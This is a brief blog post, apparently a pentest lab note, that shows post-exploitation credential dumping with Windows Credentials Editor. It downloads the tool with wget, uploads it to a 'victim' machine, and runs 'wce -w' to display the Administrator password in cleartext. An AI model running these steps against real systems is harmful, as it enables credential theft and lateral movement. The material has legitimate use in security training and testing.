---
published: true
layout: post
title: WCE post exploitation
---


Download wce

    cd /opt/
    wget http://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
    unzip wce_v1_41beta_universal.zip -d wce

Upload wce.exe to victim

**Victim**:  Execute wce.  Administrator password displayed in the clear

    C:\Documents and Settings\Administrator\My Documents>wce -w
    wce -w
    WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security -     by Hernan Ochoa (hernan@ampliasecurity.com)
    Use -h for help.

    Administrator\RALPH:_<password>_
    RALPH$\THINC.LOCAL:
